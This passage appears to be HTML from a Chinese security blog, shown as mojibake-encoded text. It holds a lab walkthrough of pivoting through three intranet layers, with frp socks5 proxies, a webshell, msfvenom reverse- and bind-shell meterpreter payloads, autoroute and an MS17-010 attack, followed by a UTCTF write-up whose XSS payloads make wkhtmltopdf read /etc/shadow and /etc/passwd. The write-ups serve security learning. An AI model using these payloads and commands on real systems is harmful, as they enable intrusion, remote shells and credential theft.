ä½¿ç”¨socksæ’ä»¶å’ŒProxifierå·¥å…·å®ç°ä»£ç†åŠŸèƒ½</span></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8600</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">plugin_user</span> = admin</span><br><span class="line"><span class="attr">plugin_passwd</span> = admin123</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†…ç½‘ç©¿é€åŠŸèƒ½  ssh 111.111.111.<span class="doctag">xxx:</span>6000</span></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8601</span></span><br></pre></td></tr></table></figure>

<p>åå°å¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frpc -c frpc.ini &amp;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬ä½¿ç”¨proxiferå·¥å…·è¿›è¡Œè®¾ç½®ï¼š</p>
<p><img data-src="/images/pages/image-20221005204356532.png" alt="image-20221005204356532"></p>
<p>æ·»åŠ åº”ç”¨safariæµè§ˆå™¨ï¼Œç„¶åè®¿é—®192.168.22.128å³å¯ï¼š</p>
<p><img data-src="/images/pages/image-20221005204428521.png" alt="image-20221005204428521"></p>
<p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å·¥å…·ï¼Œæˆ–è€…ç›´æ¥æŒ‚ä¸€ä¸ªç»ˆç«¯ä»£ç†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> all_proxy=socks5://admin:admin123@vps_ip:8608</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/image-20221005204655512.png" alt="image-20221005204655512"></p>
<p>ç°åœ¨æˆ‘ä»¬å°±è¿›å…¥åˆ°äº†ç¬¬äºŒå±‚ï¼Œç„¶åé€šè¿‡æ³¨å…¥æ‹¿åˆ°è´¦æˆ·å¯†ç å¹¶ç™»å½•åå°å†™å…¥æ¨¡ç‰ˆä¸€å¥è¯æœ¨é©¬ã€‚</p>
<p><img data-src="/images/pages/image-20221005204750956.png" alt="image-20221005204750956"></p>
<p>æˆ‘ä»¬é€šè¿‡æ·»åŠ ä»£ç†åº”ç”¨antswordåˆ°proxifierå·¥å…·ä¸­å³å¯è¿æ¥ç¬¬äºŒå±‚çš„é¶æœº2çš„æœ¨é©¬ï¼š</p>
<p><img data-src="/images/pages/image-20221005204841173.png" alt="image-20221005204841173"></p>
<p>ä¸‹é¢æˆ‘ä»¬éœ€è¦è€ƒè™‘å¦‚ä½•æ‰èƒ½è®¿é—®åˆ°ç¬¬ä¸‰å±‚ï¼Ÿå…¶å®frpæ˜¯æ”¯æŒè¿™æ ·å¤šå±‚ä»£ç†çš„ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠé¶æœº1å½“ä½œä¸­ç»§ï¼Œåšä¸€ä¸ªhttpçš„ä»£ç†ï¼Œç„¶ååœ¨é¶æœº2ä¸Šå¼€å¯socktsï¼Œå…·ä½“è®¾ç½®å¦‚ä¸‹ã€‚</p>
<p>é¦–å…ˆvpsä¸Šçš„çš„frp serveræœåŠ¡ä¸éœ€è¦æ›´æ”¹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é¶æœº1ä¸­åŒæ—¶å¯åŠ¨frpså’Œfrpcã€‚</p>
<p>å…¶ä¸­frps.iniå¦‚ä¸‹:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip = 192.168.22.131</span><br><span class="line"><span class="comment"># é¶æœº1çš„ç¬¬äºŒä¸ªç½‘æ®µipï¼Œé¶æœº2å¯è®¿é—®åˆ°ï¼Œåœ¨ä¸€ä¸ªç½‘æ®µã€‚</span></span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­frpc-proxy.iniå¦‚ä¸‹(åŸæ¥çš„frpc.iniä¹Ÿå¯ä»¥ç»§ç»­å¯åŠ¨ï¼Œè¿™æ ·æ–¹ä¾¿éšæ—¶åˆ‡æ¢åˆ°ä¸€å±‚ä»£ç†):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line"><span class="comment"># æœåŠ¡ç«¯åœ°å€</span></span><br><span class="line">server_addr = vps-ip</span><br><span class="line">server_port = 8700</span><br><span class="line">tls_enable = ture</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port= 8608</span><br><span class="line"></span><br><span class="line"><span class="comment">#plugin = scoks5 è¿™ä¸ªä¸èƒ½åŠ äº†,ç°åœ¨æ˜¯httpä¸­è½¬åˆ°ä»£ç†</span></span><br><span class="line"></span><br><span class="line">local_ip = 192.168.22.131</span><br><span class="line">local_port = 8608</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨æˆ‘ä»¬åœ¨æˆ‘ä»¬æ‹¿ä¸‹çš„é¶æœº2ä¸Šä¸Šä¼ frpï¼Œå¹¶è®¾ç½®frpc.iniï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.22.131</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 8608</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨é¶æœº1çš„frps frpc å’Œé¶æœº2çš„frpc å³å¯å®Œæˆä»£ç†ç©¿é€ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥è®¾ç½®proxifierå·¥å…·çš„ä»£ç†å¦‚ä¸‹ï¼š</p>
<p><img data-src="/images/pages/image-20221005205636335.png" alt="image-20221005205636335"></p>
<p>safariè®¿é—®æˆåŠŸ</p>
<p><img data-src="/images/pages/image-20221005210019571.png" alt="image-20221005210019571"></p>
<p>ç»ˆç«¯ä»£ç†ä¹Ÿå¯è®¿é—®æˆåŠŸ</p>
<p><img data-src="/images/pages/image-20221005210059941.png" alt="image-20221005210059941"></p>
<p>å¯ä»¥çœ‹åˆ°æœ€é‡Œé¢çš„é¶æœº3äº†ï¼Œä½†æ˜¯é¶æœº3éœ€è¦ms17010æ”»å‡»ï¼Œåœ¨è¿›è¡Œms17010æ”»å‡»æ—¶ï¼Œä»£ç†å¤šæ¬¡æ–­å¼€ï¼Œè¿™é‡Œå°±ä¸å†å±•ç¤ºæˆªå›¾äº†ã€‚æ‰€ä»¥å¦‚æœè¦ç»“åˆmsfä½¿ç”¨è¿˜æ˜¯æœ€å¥½ä½¿ç”¨msfçš„è·¯ç”±ï¼ˆåé¢ä¼šè¯¦ç»†ä»‹ç»msfçš„è·¯ç”±ç©¿é€ï¼‰ã€‚</p>
<h4 id="frpçš„ç¼ºç‚¹"><a href="#frpçš„ç¼ºç‚¹" class="headerlink" title="frpçš„ç¼ºç‚¹"></a>frpçš„ç¼ºç‚¹</h4><p>frpä¸å¤ªç¨³å®š ä½¿ç”¨msfè¿›è¡Œåˆ©ç”¨æ°¸æ’ä¹‹è“çš„æ—¶å€™æ€»æ˜¯æ–­å¼€ï¼Œæ‰€ä»¥ä¸‹é¢è¿˜æ˜¯ä»‹ç»ä¸‹msfå¦‚ä½•ç©¿é€è¿›å…¥å†…ç½‘ã€‚</p>
<p><strong>å¤‡æ³¨</strong>ï¼šfrpæœ€å¥½åå°å¯åŠ¨ è¦ä¸ç„¶ç»ˆç«¯é€€å‡ºå³å¤±æ•ˆã€‚frpå¯ä»¥å¯åŠ¨å¤šä¸ªï¼Œæ‰€ä»¥ä¸€å±‚äºŒå±‚ä»£ç†å¯ä»¥åŒæ—¶å­˜åœ¨ï¼Œåªè¦ç†æ¸…æ¥šå°±å¥½ï¼Œè¿™æ ·ä¹Ÿæ–¹ä¾¿æˆ‘ä»¬éšæ—¶æŒ‚ä¸€å±‚ä»£ç†å»è®¿é—®é¶æœº2é‡æ–°å¼€å¯äºŒå±‚ä»£ç†ã€‚</p>
<p>å¦å¤–ï¼Œfrpæ˜¯æ”¯æŒå¤šå±‚ä»£ç†çš„ï¼Œå¯ä»¥ç»§ç»­ä¿æŒå‰é¢çš„frpsä¸å˜ï¼Œåœ¨é¶æœºä¸‰ä¸Šå†æ¬¡å¼€å¯å’Œé¶æœº2ä¸€æ ·çš„frpså’Œfrpcè¿›è¡Œç¬¬ä¸‰å±‚ä»£ç†ã€‚å› ä¸ºè¿™é‡Œæ²¡æœ‰å››å±‚ç¯å¢ƒï¼Œä¹Ÿä¸å†æˆªå›¾èµ˜è¿°ã€‚**</p>
<p><strong>scokts4ä»£ç†ä¸€èˆ¬éƒ½æ˜¯èµ°çš„tcpæ‰€ä»¥è¿™ä¸ªä»£ç†å®Œä½¿ç”¨nmapä½¿ç”¨-sT ï¼Œåˆ«çš„å¯èƒ½ä¼šæ— æ³•æ‰«æåˆ°ç«¯å£ã€‚ä½†æ˜¯æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°sockts5æ˜¯æ— æ³•è¿›è¡Œnmapçš„ç«¯å£æ‰«æçš„ è¿˜ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ã€‚æˆ‘è¿™é‡Œæ‰«æç«¯å£ä½¿ç”¨çš„æ˜¯TCPç«¯å£æ‰«æå·¥å…·ï¼Œä½†æ˜¯sockts5ç©¿é€ç½‘ç»œè¿›è¡Œhttpè®¿é—®æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œè€Œkaliå’Œæ”»å‡»æœºï¼ˆmacosï¼‰ä½¿ç”¨sockts4è¿›è¡Œnmapæ‰«æä¹Ÿæ˜¯æ²¡æœ‰é—®é¢˜çš„,å°±æ˜¯éœ€è¦-sTã€‚</strong></p>
<h3 id="MSFç©¿é€ä¸‰å±‚å†…ç½‘æ‰“445"><a href="#MSFç©¿é€ä¸‰å±‚å†…ç½‘æ‰“445" class="headerlink" title="MSFç©¿é€ä¸‰å±‚å†…ç½‘æ‰“445"></a>MSFç©¿é€ä¸‰å±‚å†…ç½‘æ‰“445</h3><p>è¿™é‡Œæˆ‘ä»¬ä¸å†èµ˜è¿°å¦‚ä½•æ”»å‡»é¶æœºåªè°ˆè®ºå¦‚ä½•ä½¿ç”¨msfæ”»å‡»ç¬¬ä¸‰å±‚çš„é¶æœº3ï¼ˆwindowsæœºå™¨ï¼Œ445å­˜åœ¨æ¼æ´ï¼‰</p>
<p>è¿™é‡Œæˆ‘ä»¬åœ¨æˆ‘ä»¬çš„æ”»å‡»æœºä¸Šå¯åŠ¨msfconsole,åŒæ—¶ç”Ÿæˆä¸€ä¸ªåå‘è¿æ¥çš„elfæœ¨é©¬é€šè¿‡èšå‰‘ä¸Šä¼ åˆ°é¶æœº1ï¼ˆå³192.168.123.29&#x2F;192.168.22.131ï¼‰ä¸Šï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.123.221 LPORT=9987 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf </span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬çš„msfconsoleè®¾ç½®ç›‘å¬,èšå‰‘æ‰§è¡Œä¸Šçº¿ï¼š</p>
<p><img data-src="/images/pages/image-20221006111135484.png" alt="image-20221006111135484"></p>
<p>ä¸Šçº¿åæˆ‘ä»¬ç›´æ¥æ·»åŠ è·¯ç”±</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/image-20221006111234927.png" alt="image-20221006111234927"></p>
<p>æˆ‘ä»¬ä½¿ç”¨ä¸»æœºå‘ç°æ¨¡å—å’Œç«¯å£æ‰«ææ¨¡å—è¿›è¡Œå†…ç½‘æ‰«æï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/*</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/image-20221006112132980.png" alt="image-20221006112132980"></p>
<p>å¯ä»¥å‘ç°128è¿™ä¸ªipå­˜åœ¨å¤šä¸ªç«¯å£ï¼Œç„¶åæˆ‘ä»¬æ‹¿ä¸‹128çš„shellã€‚æ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨msfvenomè¿›è¡Œä¸€ä¸ªæ­£å‘æœ¨é©¬çš„ç”Ÿæˆï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=9002 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure>

<p>msfconsoleå¼€å¯æ–°çš„ç›‘å¬,ç„¶åèšå‰‘ä¸Šä¼ å¹¶æ‰§è¡Œå¾—åˆ°sessionï¼š</p>
<p><img data-src="/images/pages/image-20221006112417935.png" alt="image-20221006112417935"></p>
<p>ç°åœ¨æˆ‘ä»¬åœ¨æ­¤æ·»åŠ è·¯ç”±</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/image-20221006112507814.png" alt="image-20221006112507814"></p>
<p>ç„¶åç»è¿‡ä¸»æœºå‘ç°192.168.33.33å­˜åœ¨445ï¼Œå°è¯•ä¸€ä¸‹ms17010:</p>
<p><img data-src="/images/pages/image-20221006112657017.png" alt="image-20221006112657017"></p>
<p>è¿™æ ·æˆ‘ä»¬å°±æ‰“åˆ°äº†ç¬¬ä¸‰å±‚çš„é¶æœº3</p>
<p>æ‰€æœ‰é¶æœºæˆ‘ä»¬éƒ½æ‹¿åˆ°äº†ï¼š</p>
<p><img data-src="/images/pages/image-20221006113952985.png" alt="image-20221006113952985"></p>
<p><strong>å¤‡æ³¨</strong>ï¼šæ‹¿åˆ°meterpreteræ—¶ä¸è¦é€€å‡ºä½¿ç”¨backgroundåå°æŒ‚èµ·ï¼Œå¦åˆ™æ— æ³•ç»§ç»­æ¸—é€ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>frpå•å±‚ä»£ç†ç¡®å®éå¸¸ç¨³å®šï¼Œä½†æ˜¯å¤šå±‚ä»£ç†æ—¶å¹¶ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œè¿˜æ˜¯æ¨èä½¿ç”¨msfã€‚msfçš„å·¥å…·æŒºé½å…¨çš„å¯ä»¥åŸºæœ¬åšåˆ°å®Œæ•´çš„å†…ç½‘ç©¿é€åˆ©ç”¨ã€‚å½“ç„¶msfä¹Ÿæä¾›äº†sockts5çš„ä»£ç†ï¼Œå½“éœ€è¦ä½¿ç”¨çš„æ—¶å€™å¯ä»¥ä½¿ç”¨msfè¿›è¡Œsocktsä»£ç†çš„å¼€å¯ï¼Œç„¶åä½¿ç”¨proxifierå·¥å…·è¿›è¡Œå…¶ä»–å·¥å…·çš„ä»£ç†ä½¿ç”¨ã€‚åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°sockts5çš„ä»£ç†æ— è®ºæ˜¯msfçš„è¿˜æ˜¯frpçš„åœ¨è¿›è¡Œnmapæ‰«æçš„æ—¶å€™éƒ½ä¼šå‡ºé—®é¢˜ï¼Œç›®å‰åŸå› è¿˜æœªå¯çŸ¥ã€‚</p>
<p>ä¸‹æ¬¡æœ‰æ—¶é—´ææ˜ç™½ä¸ºä»€ä¹ˆsockts5åœ¨è¿›è¡Œnmapä»£ç†çš„æ—¶å€™æ— æ³•æ‰«æç«¯å£ã€‚æ— è®ºæ˜¯frpçš„sockts5è¿˜æ˜¯msfç”Ÿæˆçš„sockts5éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</p>
<h2 id="æ›´æ–°è¡¥å……"><a href="#æ›´æ–°è¡¥å……" class="headerlink" title="æ›´æ–°è¡¥å……"></a>æ›´æ–°è¡¥å……</h2><p>sockts5ä»£ç†å®˜æ–¹æœ‰è¯´æ˜å¹¶ä¸èƒ½å®Œå…¨æ”¯æŒæ‰€æœ‰åº”ç”¨ï¼Œæ‰€ä»¥sockts5æ”¯æŒnmapæ˜¯æœ‰é—®é¢˜çš„ã€‚<br>å¦å¤–scokts4å¯ä»¥æ”¯æŒéƒ¨åˆ†æ‰«æ ä»…å¯ä½¿ç”¨-sTå‚æ•°</p>
<p>è¯¦æƒ…å‚è€ƒ <a href="https://security.stackexchange.com/questions/120708/nmap-through-proxy">https://security.stackexchange.com/questions/120708/nmap-through-proxy</a></p>
]]></content>
      <categories>
        <category>å†…ç½‘å®‰å…¨</category>
      </categories>
      <tags>
        <tag>å†…ç½‘å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>UTCTF-WEB-WP</title>
    <url>//posts/UTCTF-WEB-WP/</url>
    <content><![CDATA[<h2 id="UTCTF"><a href="#UTCTF" class="headerlink" title="UTCTF"></a>UTCTF</h2><p>UTCTFæ˜¯ç”±å¾·å…‹è¨æ–¯å¤§å­¦å¥¥æ–¯æ±€åˆ†æ ¡çš„ä¿¡æ¯ä¸ç³»ç»Ÿå®‰å…¨åä¼šè¿è¥çš„ï¼Œé¢å‘å…¨ä¸–ç•Œæ‰€æœ‰äººã€‚æ­¤æ¬¡æ­£å¥½æ˜¯ä¸€ä¸ªç»ƒæ‰‹æœºä¼šï¼Œæœ€ç»ˆæ’åç¬¬20ï¼Œå…¶ä¸­ä¸»è¦åšäº†ä¸€äº›webå’Œæµé‡åˆ†æçš„é¢˜ç›®ï¼Œè¿™é‡Œç®€å•å†™ä¸‹wpã€‚</p>
<span id="more"></span>

<h2 id="HTML2PDF"><a href="#HTML2PDF" class="headerlink" title="HTML2PDF"></a>HTML2PDF</h2><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>é¢˜ç›®æ˜¯ä¸€ä¸ªæŠŠhtmlè½¬ä¸ºPDFçš„åŠŸèƒ½ã€‚</p>
<p><img data-src="/images/pages/image-20220325172212225.png" alt="image-20220325172212225"></p>
<p>è¿™é‡Œç”±äºé¢˜ç›®å…³é—­æ²¡æœ‰æ¸²æŸ“åçš„PDFæˆªå›¾äº†ï¼Œå¤§è‡´å°±æ˜¯ä¸€ä¸ªå›¾ç‰‡æ¸²æŸ“è¿›å»äº†ã€‚æˆ‘ä»¬é€šè¿‡ä¸‹è½½è¿™ä¸ªPDFæ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹æ–‡ä»¶å†…å®¹å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å›¾ç‰‡ç¡®å®æ˜¯è¢«è§£æäº†ã€‚è¯´æ˜æˆ‘ä»¬çš„ä»£ç æ˜¯è¢«æ‰§è¡Œäº†çš„ï¼Œæ‰€ä»¥æ­¤å¤„å­˜åœ¨xssï¼Œç°åœ¨æˆ‘ä»¬å°±æ˜¯éœ€è¦åˆ©ç”¨xssæ¥è¯»å–æ–‡ä»¶ã€‚</p>
<p>å…¶å®è¿™é‡Œé¢è¿˜æœ‰ä¸€ä¸ªç»†èŠ‚å°±æ˜¯å¤§éƒ¨åˆ†ç¬¬ä¸‰æ–¹ç»„ä»¶ç”Ÿæˆçš„PDFéƒ½åœ¨å¤´éƒ¨ä¿¡æ¯æœ‰æ ‡æ˜ï¼Œè¿™å°±æ¶‰åŠåˆ°ä¿¡æ¯æœé›†çš„æ•æ„Ÿåº¦äº†ã€‚ä¸€èˆ¬åœ¨PDFæ–‡ä»¶å¤´ä¿¡æ¯æˆ–è€…æ˜¯burpçš„å“åº”ä¸­èƒ½çœ‹åˆ°å…³é”®ç»„ä»¶ä¿¡æ¯ï¼Œæœ‰æ—¶å€™ä»–ä¹Ÿå­˜åœ¨äºå“åº”çš„UAä¸­,æ­¤é¢˜ç›®é€šè¿‡ä¸‹è½½çš„PDFå¤´æŸ¥çœ‹åˆ°ç”¨çš„æ˜¯wkhtmltopdfç»„ä»¶ï¼Œæ­¤ç»„ä»¶ç½‘ä¸Šä¹Ÿæœ‰ç°æˆçš„æ¼æ´èµ„æ–™ã€‚</p>
<p><a href="https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/">https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/</a></p>
<p>å¸¸ç†è¯´æˆ‘ä»¬ä¸åº”è¯¥å¯ä»¥ç›´æ¥iframeè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·é€šå¸¸ä¼šæœ‰é—®é¢˜</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;file:///xxxxx/xxxxx/*.py&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å¸¸è§æƒ…å†µä¸‹iframeæ ‡ç­¾è¯»å–ä¼šé‡åˆ°ä»€ä¹ˆé—®é¢˜ï¼Ÿ</p>
<p><img data-src="/images/pages/image-20220325175606918.png" alt="image-20220325175606918"></p>
<p><img data-src="/images/pages/image-20220325175535786.png" alt="image-20220325175535786"></p>
<p>å¯ä»¥çœ‹åˆ°æç¤ºè·¨åŸŸhttpåè®®ä¸èƒ½fileåè®®è¯»æœ¬åœ°æ–‡ä»¶ï¼Œå› ä¸ºfileåè®®å’Œhttpåè®®ä¸åŒæºï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¸€äº›xssä¸­æ— æ³•ä½¿ç”¨ä¸Šé¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶è·å–ã€‚</p>
<p>ä½†æ˜¯å› ä¸ºwkhtmltopdfåœ¨è½¬æ¢pdfçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;xxxxx&#x2F;test.html è¿™ç§è¯»å–çš„æœ¬åœ°htmlæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æ­¤å¤„ç”¨iframeçš„src fileåè®®å³å¯åŒæºè¯»å–ã€‚</p>
<p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥è¯»å– file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd ä¼šå‘ç°è¯»ä¸åˆ°ï¼Œè¿™æ˜¯å› ä¸ºä»Gecko 1.9å¼€å§‹ï¼Œfileåè®®ä¸­çš„æ–‡ä»¶ä½¿ç”¨äº†æ›´ç»†è‡´çš„åŒæºç­–ç•¥ï¼Œåªæœ‰å½“æºæ–‡ä»¶çš„çˆ¶ç›®å½•æ˜¯ç›®æ ‡æ–‡ä»¶çš„ç¥–å…ˆç›®å½•æ—¶ï¼Œæ–‡ä»¶æ‰èƒ½è¯»å–å¦ä¸€ä¸ªæ–‡ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬ä»éœ€è¦æƒ³åŠæ³•è·¨åŸŸã€‚</p>
<p>è¿™é‡Œç”¨çš„æ˜¯XHRè·¨åŸŸè¯»å–æœ¬åœ°æ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/shadow&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°shadow,ç›´æ¥çœ‹å¯†ç ï¼Œç™»å½•å³å¯å¾—flag</p>
<p><img data-src="/images/pages/image-20220327222214792.png" alt="image-20220327222214792"></p>
<h3 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h3><p>é‚£ä¹ˆå¦‚æœé‡åˆ°è·¨åŸŸé—®é¢˜æˆ‘ä»¬å¦‚ä½•è¿›è¡Œè·¨åŸŸçš„è¯»å–å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ¥å®ç°</p>
<h4 id="CORSè·¨åŸŸèµ„æºå…±äº«"><a href="#CORSè·¨åŸŸèµ„æºå…±äº«" class="headerlink" title="CORSè·¨åŸŸèµ„æºå…±äº«"></a>CORSè·¨åŸŸèµ„æºå…±äº«</h4><p>CORSè·¨åŸŸèµ„æºå…±äº«æ˜¯ç›®å‰çš„ä¸»æµæ–¹æ¡ˆï¼ŒåŸºæœ¬æ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒï¼Œå½“ç„¶IEéœ€è¦ç‰ˆæœ¬æ–°ä¸€ç‚¹ã€‚CORSè·¨åŸŸèµ„æºå…±äº«æœ¬è´¨æ˜¯ä¸€ç§åçº¦ã€‚</p>
<p>åŸç†å°±æ˜¯æµè§ˆå™¨é€šè¿‡XMLHttpRequestå‘é€è·¨åŸŸè¯·æ±‚ï¼Œå¹¶è‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ headerä¿¡æ¯ï¼ŒåŒæ—¶æœåŠ¡ç«¯çº¦å®šäº†Access-Control-Allow-Originï¼ˆå…è®¸çš„è·¨åŸŸè¯·æ±‚åŸŸåï¼‰å’ŒAccess-Control-Allow-Methodsï¼ˆå…è®¸çš„è·¨åŸŸè¯·æ±‚æ–¹å¼ï¼‰å“åº”å¤´ï¼Œå¦‚æœç¬¦åˆæ ‡å‡†åˆ™è¿”å›èµ„æºå†…å®¹ï¼Œå¦åˆ™ä¸€èˆ¬æ˜¯403ã€‚</p>
<p>å½“ç„¶ä¸€äº›å¤æ‚è¯·æ±‚æ¯”å¦‚è·¨åŸŸçš„PUTå’ŒDELETEä¼šç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œä¼šå…ˆOPTIONé¢„è¯·æ±‚ä¸‹æœåŠ¡ç«¯åŒæ ·éªŒè¯é€šè¿‡åå†è¿›è¡Œä¸‹ä¸€æ­¥çš„è·¨åŸŸè¯·æ±‚ï¼Œæ­¤å¤„çš„å®ç°ç»†èŠ‚å’Œç®€å•çš„GETå’ŒPOSTè¯·æ±‚å¯èƒ½ç•¥æœ‰ä¸åŒï¼Œæ­¤å¤„ä¸åœ¨å±•å¼€ï¼Œä»¥å…å å¤ªå¤§ç¯‡å¹…ï¼Œä»¥åæœ‰æœºä¼šå†è¯¦ç»†è®²è®²ã€‚</p>
<p>é‚£ä¹ˆåŸºäºæ­¤æˆ‘ä»¬å°±çŸ¥é“å¦‚ä½•è¿›è¡Œè·¨åŸŸè¯·æ±‚äº†ï¼šXMLHttpRequest<br>payload1:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
